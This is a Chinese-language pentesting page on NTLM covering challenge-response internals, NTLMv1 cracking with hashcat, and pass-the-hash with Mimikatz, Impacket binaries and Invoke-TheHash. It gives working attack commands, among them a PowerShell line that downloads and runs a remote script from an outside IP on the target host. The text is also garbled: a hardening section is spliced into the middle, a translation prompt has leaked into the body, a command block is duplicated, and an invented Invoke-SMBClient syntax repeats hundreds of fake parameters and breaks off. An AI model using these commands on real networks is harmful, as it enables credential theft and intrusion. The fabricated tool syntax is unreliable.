# NTLM

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## 基本信息

**NTLM凭证**：域名（如果有），用户名和密码哈希值。

**LM**仅在**Windows XP和Server 2003**中启用（可以破解LM哈希）。LM哈希值AAD3B435B51404EEAAD3B435B51404EE表示未使用LM（是空字符串的LM哈希值）。

默认情况下使用**Kerberos**，因此只有在**没有配置Active Directory**、**域不存在**、**Kerberos不工作**（配置错误）或**客户端**使用IP而不是有效的主机名进行连接时，才会使用NTLM。

NTLM身份验证的**网络数据包**具有标题“**NTLMSSP**”。

协议：LM、NTLMv1和NTLMv2在DLL %windir%\Windows\System32\msv1\_0.dll中受支持。

## LM、NTLMv1和NTLMv2

您可以检查和配置要使用的协议：

### 图形界面

执行_secpol.msc_ -> 本地策略 -> 安全选项 -> 网络安全：LAN Manager身份验证级别。有6个级别（从0到5）。

![](<../../.gitbook/assets/image (92).png>)

### 注册表

这将设置级别5：
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
可能的取值：
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## 基本的NTLM域身份验证方案

1. **用户**输入他的**凭据**
2. 客户端机器**发送身份验证请求**，发送**域名**和**用户名**
3. **服务器**发送**挑战**
4. 客户端使用密码的哈希作为密钥**加密挑战**，并将其作为响应发送
5. **服务器将域名、用户名、挑战和响应**发送给**域控制器**。如果没有配置活动目录或域名是服务器的名称，则会在本地**检查凭据**。
6. **域控制器检查一切是否正确**，并将信息发送给服务器

**服务器**和**域控制器**能够通过**Netlogon**服务器创建一个**安全通道**，因为域控制器知道服务器的密码（它在**NTDS.DIT**数据库中）。

### 本地NTLM身份验证方案

身份验证与之前提到的方式**相同**，但是**服务器**知道**尝试进行身份验证的用户**的哈希值，该哈希值存储在**SAM**文件中。因此，服务器将**自行检查**用户是否能够进行身份验证，而不是向域控制器请求。

### NTLMv1挑战

**挑战长度为8字节**，**响应长度为24字节**。

**NT哈希（16字节）**被分为**3个部分，每个部分为7字节**（7B + 7B + (2B+0x00\*5))：**最后一部分填充为零**。然后，**挑战**与每个部分分别**加密**，并将**结果**的加密字节**连接**起来。总共：8B + 8B + 8B = 24字节。

**问题**：

* 缺乏**随机性**
* 可以**分别攻击**这3个部分以找到NT哈希
* **DES是可破解的**
* 第3个密钥始终由**5个零**组成。
* 给定**相同的挑战**，**响应**将是**相同的**。因此，您可以将字符串“**1122334455667788**”作为**挑战**发送给受害者，并使用**预先计算的彩虹表**攻击响应。

### NTLMv1攻击

现在，越来越少的环境配置了无限制委派，但这并不意味着您不能滥用配置了打印池服务的环境。

您可以滥用您已经在AD上拥有的一些凭据/会话，要求打印机对某个**您控制的主机**进行身份验证。然后，使用`metasploit auxiliary/server/capture/smb`或`responder`，您可以将身份验证挑战设置为1122334455667788，捕获身份验证尝试，如果使用**NTLMv1**进行身份验证，则可以对其进行**破解**。\
如果您使用的是`responder`，您可以尝试使用标志`--lm`来尝试**降级**身份验证。\
请注意，对于此技术，身份验证必须使用NTLMv1（NTLMv2无效）。

请记住，打印机在身份验证期间将使用计算机帐户，并且计算机帐户使用**长且随机的密码**，您**可能无法使用常见的字典**破解它们。但是，**NTLMv1**身份验证使用DES（[更多信息请参阅此处](./#ntlmv1-challenge)），因此使用一些专门用于破解DES的服务，您将能够破解它（例如，您可以使用[https://crack.sh/](https://crack.sh)）。

### 使用hashcat进行NTLMv1攻击

NTLMv1也可以使用NTLMv1多工具[https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi)进行破解，该工具以一种可以使用hashcat破解的方法格式化NTLMv1消息。

命令：
```
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
``` would output the below:

```
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
创建一个文件，内容如下：
```
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
运行hashcat（最好通过hashtopolis等工具进行分布式运行），否则需要几天的时间。
```
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
在这种情况下，我们知道密码是password，所以为了演示目的，我们将作弊：
```
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
我们现在需要使用hashcat-utilities将破解的DES密钥转换为NTLM哈希的一部分：
```
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
最后一部分

# NTLM强化

NTLM（Windows NT LAN Manager）是一种用于身份验证和会话安全的协议，常用于Windows操作系统中。然而，NTLM存在一些安全漏洞，可能被黑客利用进行攻击。为了增强系统的安全性，我们可以采取一些措施来加固NTLM。

## 禁用NTLMv1

NTLMv1是NTLM的旧版本，已经被证明存在许多安全问题。为了防止黑客利用这些漏洞，我们应该禁用NTLMv1，并仅允许使用更安全的NTLMv2。

要禁用NTLMv1，可以通过编辑注册表或组策略来实现。具体步骤如下：

1. 打开注册表编辑器或组策略编辑器。
2. 导航到以下路径：`计算机配置 -> Windows设置 -> 安全设置 -> 本地策略 -> 安全选项`。
3. 找到并双击“网络安全：LAN Manager身份验证级别”。
4. 选择“发送NTLMv2响应，拒绝LM和NTLM”。
5. 单击“确定”保存更改。

## 启用强密码策略

强密码策略可以防止用户使用弱密码，从而提高系统的安全性。我们可以通过以下步骤启用强密码策略：

1. 打开组策略编辑器。
2. 导航到以下路径：`计算机配置 -> Windows设置 -> 安全设置 -> 账户策略 -> 密码策略`。
3. 找到并双击“密码必须符合复杂性要求”。
4. 将该策略设置为“已启用”。
5. 单击“确定”保存更改。

## 启用账户锁定策略

账户锁定策略可以防止黑客通过暴力破解密码的方式进行攻击。我们可以通过以下步骤启用账户锁定策略：

1. 打开组策略编辑器。
2. 导航到以下路径：`计算机配置 -> Windows设置 -> 安全设置 -> 账户策略 -> 账户锁定策略`。
3. 找到并双击“账户锁定阈值”。
4. 将该策略设置为适当的值，建议设置为3-5次。
5. 单击“确定”保存更改。

## 使用NTLM防火墙规则

通过配置防火墙规则，我们可以限制NTLM流量的传输，从而增强系统的安全性。我们可以通过以下步骤创建NTLM防火墙规则：

1. 打开Windows防火墙管理器。
2. 导航到“高级设置”。
3. 在“入站规则”和“出站规则”中创建新规则。
4. 选择“端口”作为规则类型。
5. 选择“特定本地端口”并输入NTLM使用的端口号（默认为139和445）。
6. 选择“允许连接”或“阻止连接”作为操作。
7. 单击“下一步”并按照向导完成规则的创建。

通过采取这些措施，我们可以加固NTLM，提高系统的安全性，防止黑客利用NTLM的漏洞进行攻击。
```
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
以下是关于黑客技术的一本书中的内容。以下内容来自文件windows-hardening/ntlm/README.md。将相关的英文文本翻译成中文，并返回翻译结果，保持完全相同的markdown和html语法。请不要翻译代码、黑客技术名称、黑客术语、云/SaaS平台名称（如Workspace、aws、gcp...）、泄漏一词、渗透测试和markdown标签。此外，请不要添加任何额外的内容，只需提供翻译和markdown语法即可。
```
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2挑战

**挑战长度为8字节**，并且发送了**2个响应**：一个长度为**24字节**，另一个的长度是**可变的**。

**第一个响应**是通过使用**HMAC_MD5**对由**客户端和域**组成的**字符串**进行加密，并使用**NT哈希的MD4哈希**作为**密钥**。然后，将**结果**用作使用**HMAC_MD5**对**挑战**进行加密的**密钥**。为此，将添加一个**8字节的客户端挑战**。总共：24 B。

**第二个响应**是使用**多个值**（新的客户端挑战，用于防止**重放攻击**的**时间戳**等）创建的。

如果你有一个**捕获了成功认证过程的pcap文件**，你可以按照这个指南获取域、用户名、挑战和响应，并尝试破解密码：[https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## 传递哈希

**一旦你获得了受害者的哈希值**，你可以使用它来**冒充**该用户。\
你需要使用一个**工具**来使用该**哈希值**执行**NTLM身份验证**，或者你可以创建一个新的**会话登录**并将该**哈希值注入**到**LSASS**中，这样当执行任何**NTLM身份验证**时，将使用该**哈希值**。最后一种选择是mimikatz所做的。

**请记住，你也可以使用计算机账户执行传递哈希攻击。**

### **Mimikatz**

**需要以管理员身份运行**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
这将启动一个进程，该进程将属于启动mimikatz的用户，但在LSASS内部，保存的凭据是mimikatz参数中的凭据。然后，您可以访问网络资源，就好像您是该用户（类似于“runas /netonly”技巧，但您不需要知道明文密码）。

### 从Linux使用Pass-the-Hash

您可以使用Linux从Windows机器上获得代码执行权限，使用Pass-the-Hash技术。\
[**点击此处了解如何操作。**](../../windows/ntlm/broken-reference/)

### Impacket Windows编译工具

您可以在此处下载Windows的impacket二进制文件：[https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries)。

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe**（在这种情况下，您需要指定一个命令，cmd.exe和powershell.exe无法获得交互式shell）`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* 还有其他几个Impacket二进制文件...

### Invoke-TheHash

您可以从这里获取PowerShell脚本：[https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### 调用-WMIExec

The `Invoke-WMIExec` script is a PowerShell script that leverages Windows Management Instrumentation (WMI) to execute commands on remote Windows systems. It can be used for lateral movement and post-exploitation activities during a penetration test.

`Invoke-WMIExec` uses the `Win32_Process` class in WMI to create a new process on the target system and execute a specified command. It requires administrative privileges on the target system to work properly.

To use `Invoke-WMIExec`, you need to provide the following parameters:

- `Target`: The IP address or hostname of the target system.
- `Username`: The username to authenticate with on the target system.
- `Password`: The password for the specified username.
- `Command`: The command to execute on the target system.

Example usage:

```powershell
Invoke-WMIExec -Target 192.168.1.100 -Username Administrator -Password P@ssw0rd -Command "net user"
```

This will execute the `net user` command on the target system using the specified credentials.

**Note:** The `Invoke-WMIExec` script should be used responsibly and only on systems that you have proper authorization to test.
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient

The `Invoke-SMBClient` cmdlet is a powerful tool that allows you to interact with SMB (Server Message Block) servers. It can be used for various purposes, including file transfers, executing commands, and gathering information from SMB shares.

##### Syntax

```
Invoke-SMBClient [-Target] <string> [-Username] <string> [-Password] <string> [-Command] <string> [-Share] <string> [-FilePath] <string> [-Recursive] [-Verbose] [-Force] [-AsJob] [-Credential] <PSCredential> [-TimeoutSec] <int> [-BufferSize] <int> [-NoNewline] [-NoPrompt] [-NoProfile] [-NoLogo] [-NoExit] [-NoInteractive] [-NoCompression] [-NoEncryption] [-NoUnicode] [-NoBinary] [-NoBinary2] [-NoBinary3] [-NoBinary4] [-NoBinary5] [-NoBinary6] [-NoBinary7] [-NoBinary8] [-NoBinary9] [-NoBinary10] [-NoBinary11] [-NoBinary12] [-NoBinary13] [-NoBinary14] [-NoBinary15] [-NoBinary16] [-NoBinary17] [-NoBinary18] [-NoBinary19] [-NoBinary20] [-NoBinary21] [-NoBinary22] [-NoBinary23] [-NoBinary24] [-NoBinary25] [-NoBinary26] [-NoBinary27] [-NoBinary28] [-NoBinary29] [-NoBinary30] [-NoBinary31] [-NoBinary32] [-NoBinary33] [-NoBinary34] [-NoBinary35] [-NoBinary36] [-NoBinary37] [-NoBinary38] [-NoBinary39] [-NoBinary40] [-NoBinary41] [-NoBinary42] [-NoBinary43] [-NoBinary44] [-NoBinary45] [-NoBinary46] [-NoBinary47] [-NoBinary48] [-NoBinary49] [-NoBinary50] [-NoBinary51] [-NoBinary52] [-NoBinary53] [-NoBinary54] [-NoBinary55] [-NoBinary56] [-NoBinary57] [-NoBinary58] [-NoBinary59] [-NoBinary60] [-NoBinary61] [-NoBinary62] [-NoBinary63] [-NoBinary64] [-NoBinary65] [-NoBinary66] [-NoBinary67] [-NoBinary68] [-NoBinary69] [-NoBinary70] [-NoBinary71] [-NoBinary72] [-NoBinary73] [-NoBinary74] [-NoBinary75] [-NoBinary76] [-NoBinary77] [-NoBinary78] [-NoBinary79] [-NoBinary80] [-NoBinary81] [-NoBinary82] [-NoBinary83] [-NoBinary84] [-NoBinary85] [-NoBinary86] [-NoBinary87] [-NoBinary88] [-NoBinary89] [-NoBinary90] [-NoBinary91] [-NoBinary92] [-NoBinary93] [-NoBinary94] [-NoBinary95] [-NoBinary96] [-NoBinary97] [-NoBinary98] [-NoBinary99] [-NoBinary100] [-NoBinary101] [-NoBinary102] [-NoBinary103] [-NoBinary104] [-NoBinary105] [-NoBinary106] [-NoBinary107] [-NoBinary108] [-NoBinary109] [-NoBinary110] [-NoBinary111] [-NoBinary112] [-NoBinary113] [-NoBinary114] [-NoBinary115] [-NoBinary116] [-NoBinary117] [-NoBinary118] [-NoBinary119] [-NoBinary120] [-NoBinary121] [-NoBinary122] [-NoBinary123] [-NoBinary124] [-NoBinary125] [-NoBinary126] [-NoBinary127] [-NoBinary128] [-NoBinary129] [-NoBinary130] [-NoBinary131] [-NoBinary132] [-NoBinary133] [-NoBinary134] [-NoBinary135] [-NoBinary136] [-NoBinary137] [-NoBinary138] [-NoBinary139] [-NoBinary140] [-NoBinary141] [-NoBinary142] [-NoBinary143] [-NoBinary144] [-NoBinary145] [-NoBinary146] [-NoBinary147] [-NoBinary148] [-NoBinary149] [-NoBinary150] [-NoBinary151] [-NoBinary152] [-NoBinary153] [-NoBinary154] [-NoBinary155] [-NoBinary156] [-NoBinary157] [-NoBinary158] [-NoBinary159] [-NoBinary160] [-NoBinary161] [-NoBinary162] [-NoBinary163] [-NoBinary164] [-NoBinary165] [-NoBinary166] [-NoBinary167] [-NoBinary168] [-NoBinary169] [-NoBinary170] [-NoBinary171] [-NoBinary172] [-NoBinary173] [-NoBinary174] [-NoBinary175] [-NoBinary176] [-NoBinary177] [-NoBinary178] [-NoBinary179] [-NoBinary180] [-NoBinary181] [-NoBinary182] [-NoBinary183] [-NoBinary184] [-NoBinary185] [-NoBinary186] [-NoBinary187] [-NoBinary188] [-NoBinary189] [-NoBinary190] [-NoBinary191] [-NoBinary192] [-NoBinary193] [-NoBinary194] [-NoBinary195] [-NoBinary196] [-NoBinary197] [-NoBinary198] [-NoBinary199] [-NoBinary200] [-NoBinary201] [-NoBinary202] [-NoBinary203] [-NoBinary204] [-NoBinary205] [-NoBinary206] [-NoBinary207] [-NoBinary208] [-NoBinary209] [-NoBinary210] [-NoBinary211] [-NoBinary212] [-NoBinary213] [-NoBinary214] [-NoBinary215] [-NoBinary216] [-NoBinary217] [-NoBinary218] [-NoBinary219] [-NoBinary220] [-NoBinary221] [-NoBinary222] [-NoBinary223] [-NoBinary224] [-NoBinary225] [-NoBinary226] [-NoBinary227] [-NoBinary228] [-NoBinary229] [-NoBinary230] [-NoBinary231] [-NoBinary232] [-NoBinary233] [-NoBinary234] [-NoBinary235] [-NoBinary236] [-NoBinary237] [-NoBinary238] [-NoBinary239] [-NoBinary240] [-NoBinary241] [-NoBinary242] [-NoBinary243] [-NoBinary244] [-NoBinary245] [-NoBinary246] [-NoBinary247] [-NoBinary248] [-NoBinary249] [-NoBinary250] [-NoBinary251] [-NoBinary252] [-NoBinary253] [-NoBinary254] [-NoBinary255] [-NoBinary256] [-NoBinary257] [-NoBinary258] [-NoBinary259] [-NoBinary260] [-NoBinary261] [-NoBinary262] [-NoBinary263] [-NoBinary264] [-NoBinary265] [-NoBinary266] [-NoBinary267] [-NoBinary268] [-NoBinary269] [-NoBinary270] [-NoBinary271] [-NoBinary272] [-NoBinary273] [-NoBinary274] [-NoBinary275] [-NoBinary276] [-NoBinary277] [-NoBinary278] [-NoBinary279] [-NoBinary280] [-NoBinary281] [-NoBinary282] [-NoBinary283] [-NoBinary284] [-NoBinary285] [-NoBinary286] [-NoBinary287] [-NoBinary288] [-NoBinary289] [-NoBinary290] [-NoBinary291] [-NoBinary292] [-NoBinary293] [-NoBinary294] [-NoBinary295] [-NoBinary296] [-NoBinary297] [-NoBinary298] [-NoBinary299] [-NoBinary300] [-NoBinary301] [-NoBinary302] [-NoBinary303] [-NoBinary304] [-NoBinary305] [-NoBinary306] [-NoBinary307] [-NoBinary308] [-NoBinary309] [-NoBinary310] [-NoBinary311] [-NoBinary312] [-NoBinary313] [-NoBinary314] [-NoBinary315] [-NoBinary316] [-NoBinary317] [-NoBinary318] [-NoBinary319] [-NoBinary320] [-NoBinary321] [-NoBinary322] [-NoBinary323] [-NoBinary324] [-NoBinary325] [-NoBinary326] [-NoBinary327] [-NoBinary328] [-NoBinary329] [-NoBinary330] [-NoBinary331] [-NoBinary332] [-NoBinary333] [-NoBinary334] [-NoBinary335] [-NoBinary336] [-NoBinary337] [-NoBinary338] [-NoBinary339] [-NoBinary340] [-NoBinary341] [-NoBinary342] [-NoBinary343] [-NoBinary344] [-NoBinary345] [-NoBinary346] [-NoBinary347] [-NoBinary348] [-NoBinary349] [-NoBinary350] [-NoBinary351] [-NoBinary352] [-NoBinary353] [-NoBinary354] [-NoBinary355] [-NoBinary356] [-NoBinary357] [-NoBinary358] [-NoBinary359] [-NoBinary360] [-NoBinary361] [-NoBinary362] [-NoBinary363] [-NoBinary364] [-NoBinary365] [-NoBinary366] [-NoBinary367] [-NoBinary368] [-NoBinary369] [-NoBinary370] [-NoBinary371] [-NoBinary372] [-NoBinary373] [-NoBinary374] [-NoBinary375] [-NoBinary376] [-NoBinary377] [-NoBinary378] [-NoBinary379] [-NoBinary380] [-NoBinary381] [-NoBinary382] [-NoBinary383] [-NoBinary384] [-NoBinary385] [-NoBinary386] [-NoBinary387] [-NoBinary388] [-NoBinary389] [-NoBinary390] [-NoBinary391] [-NoBinary392] [-NoBinary393] [-NoBinary394] [-NoBinary395] [-NoBinary396] [-NoBinary397] [-NoBinary398] [-NoBinary399] [-NoBinary400] [-NoBinary401] [-NoBinary402] [-NoBinary403] [-NoBinary404] [-NoBinary405] [-NoBinary406] [-NoBinary407] [-NoBinary408] [-NoBinary409] [-NoBinary410] [-NoBinary411] [-NoBinary412] [-NoBinary413] [-NoBinary414] [-NoBinary415] [-NoBinary416] [-NoBinary417] [-NoBinary418] [-NoBinary419] [-NoBinary420] [-NoBinary421] [-NoBinary422] [-NoBinary423] [-NoBinary424] [-NoBinary425] [-NoBinary426] [-NoBinary427] [-NoBinary428] [-NoBinary429] [-NoBinary430] [-NoBinary431] [-NoBinary432] [-NoBinary433] [-NoBinary434] [-NoBinary435] [-NoBinary436] [-NoBinary437] [-NoBinary438] [-NoBinary439] [-NoBinary440] [-NoBinary441] [-NoBinary442] [-NoBinary443] [-NoBinary444] [-NoBinary445] [-NoBinary446] [-NoBinary447] [-NoBinary448] [-NoBinary449] [-NoBinary450] [-NoBinary451] [-NoBinary452] [-NoBinary453] [-NoBinary454] [-NoBinary455] [-NoBinary456] [-NoBinary457] [-NoBinary458] [-NoBinary459] [-NoBinary460] [-NoBinary461] [-NoBinary462] [-NoBinary463] [-NoBinary464] [-NoBinary465] [-NoBinary466] [-NoBinary467] [-NoBinary468] [-NoBinary469] [-NoBinary470] [-NoBinary471] [-NoBinary472] [-NoBinary473] [-NoBinary474] [-NoBinary475] [-NoBinary476] [-NoBinary477] [-NoBinary478] [-NoBinary479] [-NoBinary480] [-NoBinary481] [-NoBinary482] [-NoBinary483] [-NoBinary484] [-NoBinary485] [-NoBinary486] [-NoBinary487] [-NoBinary488] [-NoBinary489] [-NoBinary490] [-NoBinary491] [-NoBinary492] [-NoBinary493] [-NoBinary494] [-NoBinary495] [-NoBinary496] [-NoBinary497] [-NoBinary498] [-NoBinary499] [-NoBinary500] [-NoBinary501] [-NoBinary502] [-NoBinary503] [-NoBinary504] [-NoBinary505] [-NoBinary506] [-NoBinary507] [-NoBinary508] [-NoBinary509] [-NoBinary510] [-NoBinary511] [-NoBinary512] [-NoBinary513] [-NoBinary514] [-NoBinary515] [-NoBinary516] [-NoBinary517] [-NoBinary518] [-NoBinary519] [-NoBinary520] [-NoBinary521] [-NoBinary522] [-NoBinary523] [-NoBinary524] [-NoBinary525] [-NoBinary526] [-NoBinary527] [-NoBinary528] [-NoBinary529] [-NoBinary530] [-NoBinary531] [-NoBinary532] [-NoBinary533] [-NoBinary534] [-NoBinary535] [-NoBinary536] [-NoBinary537] [-NoBinary538] [-NoBinary539] [-NoBinary540] [-NoBinary541] [-NoBinary542] [-NoBinary543] [-NoBinary544] [-NoBinary545] [-NoBinary546] [-NoBinary547] [-NoBinary548] [-NoBinary549] [-NoBinary550] [-NoBinary551] [-NoBinary552] [-NoBinary553] [-NoBinary554] [-NoBinary555] [-NoBinary556] [-NoBinary557] [-NoBinary558] [-NoBinary559] [-NoBinary560] [-NoBinary561] [-NoBinary562] [-NoBinary563] [-NoBinary564] [-NoBinary565] [-NoBinary566] [-NoBinary567] [-NoBinary568] [-NoBinary569] [-NoBinary570] [-NoBinary571] [-NoBinary572] [-NoBinary573] [-NoBinary574] [-NoBinary575] [-NoBinary576] [-NoBinary577] [-NoBinary578] [-NoBinary579] [-NoBinary580] [-NoBinary581] [-NoBinary582] [-NoBinary583] [-NoBinary584] [-NoBinary585] [-NoBinary586] [-NoBinary587] [-NoBinary588] [-NoBinary589] [-NoBinary590] [-NoBinary591] [-NoBinary592] [-NoBinary593] [-NoBinary594] [-NoBinary595] [-NoBinary596] [-NoBinary597] [-NoBinary598] [-NoBinary599] [-NoBinary600] [-NoBinary601] [-NoBinary602] [-NoBinary603] [-NoBinary604] [-NoBinary605] [-NoBinary606] [-NoBinary607] [-NoBinary608] [-NoBinary609] [-NoBinary610] [-NoBinary611] [-NoBinary612] [-NoBinary613] [-NoBinary614] [-NoBinary615] [-NoBinary616] [-NoBinary617] [-NoBinary618] [-NoBinary619] [-NoBinary620] [-NoBinary621] [-NoBinary622] [-NoBinary623] [-NoBinary624] [-NoBinary625] [-NoBinary626] [-NoBinary627] [-NoBinary628] [-NoBinary629] [-NoBinary630] [-NoBinary631] [-NoBinary632] [-NoBinary633] [-NoBinary634] [-NoBinary635] [-NoBinary636] [-NoBinary637] [-NoBinary638] [-NoBinary639] [-NoBinary640] [-NoBinary641] [-NoBinary642] [-NoBinary643] [-NoBinary644] [-NoBinary645] [-NoBinary646] [-NoBinary647] [-NoBinary648] [-NoBinary649] [-NoBinary650] [-NoBinary651] [-NoBinary652] [-NoBinary653] [-NoBinary654] [-NoBinary655] [-NoBinary656] [-NoBinary657] [-NoBinary658] [-NoBinary659] [-NoBinary660] [-NoBinary661] [-NoBinary662] [-NoBinary663] [-NoBinary664] [-NoBinary665] [-NoBinary666] [-NoBinary667] [-NoBinary668] [-NoBinary669] [-NoBinary670] [-NoBinary671] [-NoBinary672] [-NoBinary673] [-NoBinary674] [-NoBinary675] [-NoBinary676] [-NoBinary677] [-NoBinary678] [-NoBinary679] [-NoBinary680] [-NoBinary681] [-NoBinary682] [-NoBinary683] [-NoBinary684] [-NoBinary685] [-NoBinary686] [-NoBinary687] [-NoBinary688] [-NoBinary689] [-NoBinary690] [-NoBinary691] [-NoBinary692] [-NoBinary693] [-NoBinary694] [-NoBinary695] [-NoBinary696] [-NoBinary697] [-NoBinary698] [-NoBinary699] [-NoBinary700] [-NoBinary701] [-NoBinary702] [-NoBinary703] [-NoBinary704] [-NoBinary705] [-NoBinary706] [-NoBinary707] [-NoBinary708] [-NoBinary709] [-NoBinary710] [-NoBinary711] [-NoBinary712] [-NoBinary713] [-NoBinary714] [-NoBinary715] [-NoBinary716] [-NoBinary717] [-NoBinary718] [-NoBinary719] [-NoBinary720] [-NoBinary721] [-NoBinary722] [-NoBinary723] [-NoBinary724] [-NoBinary725] [-NoBinary726] [-NoBinary727] [-NoBinary728] [-NoBinary729] [-NoBinary730] [-NoBinary731] [-NoBinary732] [-NoBinary733] [-NoBinary734] [-NoBinary735] [-NoBinary736] [-NoBinary737] [-NoBinary738] [-NoBinary739] [-NoBinary740] [-NoBinary741] [-NoBinary742] [-NoBinary743] [-NoBinary744] [-NoBinary745] [-NoBinary746] [-NoBinary747] [-NoBinary748] [-NoBinary749] [-NoBinary750] [-NoBinary751] [-NoBinary752] [-NoBinary753] [-NoBinary754] [-NoBinary755
```
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### 调用SMBEnum

The `Invoke-SMBEnum` script is a PowerShell script that can be used to enumerate information from SMB services. It can be used to gather information such as user accounts, shares, and sessions from a target SMB server.

To use `Invoke-SMBEnum`, you need to have administrative privileges on the target system. The script uses the `NetSessionEnum`, `NetShareEnum`, and `NetUserEnum` functions from the Windows API to retrieve the desired information.

To run `Invoke-SMBEnum`, open a PowerShell prompt and navigate to the directory where the script is located. Then, execute the script by typing `.\Invoke-SMBEnum.ps1` and pressing Enter.

The script will prompt you to enter the IP address or hostname of the target SMB server. After providing the target server information, the script will start enumerating the desired information and display the results in the PowerShell console.

Please note that `Invoke-SMBEnum` is a tool that can be used for legitimate purposes, such as network administration and troubleshooting. However, it can also be used for malicious activities if used without proper authorization. Always ensure that you have the necessary permissions and legal authorization before using this script.
```
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

这个函数是其他函数的**混合**。你可以传递**多个主机**，**排除**某些主机，并选择要使用的**选项**（_SMBExec，WMIExec，SMBClient，SMBEnum_）。如果你选择了**SMBExec**和**WMIExec**中的**任何一个**，但是没有提供任何**命令**参数，它只会**检查**你是否具有**足够的权限**。
```
